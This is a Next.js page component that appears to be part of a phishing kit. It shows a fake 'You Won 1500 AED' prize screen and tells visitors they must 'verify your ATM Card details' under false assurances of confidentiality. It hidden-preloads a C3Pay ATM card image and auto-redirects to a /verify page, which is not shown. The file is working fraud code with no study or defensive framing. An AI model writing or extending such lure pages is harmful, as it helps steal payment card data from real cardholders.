"use client"

import { useEffect } from "react"
import { useRouter } from "next/navigation"
import Image from "next/image"
import { ShieldCheck, TriangleAlert } from "lucide-react"
import { AnimatedCheckBadge } from "@/components/animated-check-badge"

const confetti = [
  "left-[12%] top-[9%] h-1 w-4 rotate-12",
  "left-[22%] top-[13%] h-2 w-2 rotate-12",
  "left-[35%] top-[10%] h-2 w-2",
  "left-[61%] top-[7%] h-1.5 w-1.5",
  "right-[17%] top-[13%] h-2 w-2 -rotate-12",
  "right-[26%] top-[18%] h-1 w-3 rotate-12",
  "left-[11%] top-[18%] h-1 w-3 -rotate-12",
  "left-[23%] top-[24%] h-1.5 w-1.5",
]

export default function RewardPage() {
  const router = useRouter()

  useEffect(() => {
    // Warm the router cache and the browser's image cache for the next
    // screen so it renders instantly instead of showing a loading flash.
    router.prefetch("/verify")

    const timer = setTimeout(() => {
      router.push("/verify")
    }, 3000)

    return () => clearTimeout(timer)
  }, [router])

  return (
    <main className="relative min-h-svh overflow-hidden bg-[#effcf5] px-7 pt-44 text-center text-[#142033]">
      {/* Hidden preload: forces the browser to fetch and cache the ATM card
          image now, so /verify can paint it with zero delay. */}
      <Image
        src="/images/c3pay-atm-card.png"
        alt=""
        width={1600}
        height={1000}
        priority
        aria-hidden="true"
        className="pointer-events-none absolute h-px w-px opacity-0"
      />

      {confetti.map((style, index) => (
        <span
          key={index}
          aria-hidden="true"
          className={`absolute rounded-sm ${style} ${index % 3 === 0 ? "bg-[#27c76b]" : "bg-[#ffc42f]"}`}
        />
      ))}

      <section className="relative rounded-[24px] bg-white px-7 pb-7 pt-16 shadow-[0_10px_30px_rgba(20,150,75,0.12)]">
        <AnimatedCheckBadge />

        <h1 className="font-serif text-[30px] font-bold italic leading-tight text-[#159c4b]">
          Congratulations!
        </h1>

        <div className="my-5 flex items-center justify-center gap-3 text-[#18a753]">
          <span className="h-px w-24 bg-[#dfe3e6]" />
          <span className="text-sm">★</span>
          <span className="h-px w-24 bg-[#dfe3e6]" />
        </div>

        <p className="text-[52px] font-extrabold leading-none tracking-tight text-[#159c4b]">1500 AED</p>
        <p className="mt-2 text-base font-extrabold">You Won</p>

        <div className="mx-auto mt-5 flex w-fit items-center gap-2 rounded-full border border-[#ffc58a] bg-[#fffaf4] px-5 py-2 text-xs font-extrabold tracking-wide text-[#f36b21]">
          <TriangleAlert className="h-4 w-4 fill-[#ffd225] text-black" />
          MANDATORY STEP
        </div>

        <p className="mx-auto mt-5 max-w-[280px] text-[15px] leading-6 text-[#566174]">
          You must verify your ATM Card details to receive your reward within <strong className="text-[#159c4b]">4–24 hours</strong>
        </p>

        <div className="relative mt-6 flex items-center gap-3 overflow-hidden rounded-2xl bg-[#16a94f] px-5 py-4 text-left text-white">
          <div className="flex h-10 w-10 shrink-0 items-center justify-center rounded-full bg-[#39bb6b]">
            <ShieldCheck className="h-5 w-5" />
          </div>
          <div>
            <h2 className="text-base font-extrabold">Secure Verification</h2>
            <p className="mt-0.5 text-xs leading-4 text-white/90">Your information is safe with us and will remain confidential.</p>
          </div>
        </div>
      </section>
    </main>
  )
}
